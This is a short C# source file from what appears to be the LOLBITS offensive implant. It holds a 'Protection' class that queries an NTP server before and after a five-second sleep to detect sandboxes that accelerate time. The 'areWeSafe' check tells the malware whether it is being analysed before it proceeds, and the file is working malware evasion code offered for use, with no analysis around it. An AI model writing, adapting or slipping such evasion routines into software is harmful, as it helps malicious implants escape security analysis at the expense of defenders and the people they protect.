using System.Net;
using System.Net.Sockets;
using System.Threading;

namespace LOLBITS.Protection
{
    class Sleepy
    {

        public static uint GetNTPTime()
        {

            var NTPTransmit = new byte[48];
            NTPTransmit[0] = 0x1B;

            var addr = Dns.GetHostEntry("us.pool.ntp.org").AddressList;
            var sock = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp);
            sock.Connect(new IPEndPoint(addr[0], 123));
            sock.ReceiveTimeout = 2000;
            sock.Send(NTPTransmit);
            sock.Receive(NTPTransmit);
            sock.Close();

            uint runTotal = 0; for (int i = 40; i <= 43; ++i) { runTotal = runTotal * 256 + (uint)NTPTransmit[i]; }
            return runTotal - 2208988800;
        }


        public static bool areWeSafe()
        {
            try
            {
                var firstTime = GetNTPTime();
                Thread.Sleep(int.Parse("5") * 1000);
                var secondTime = GetNTPTime();
                var difference = secondTime - firstTime;
                return difference >= uint.Parse("5") ? true : false;
            }
            catch
            {
                return true;
            }

        }
    }
}
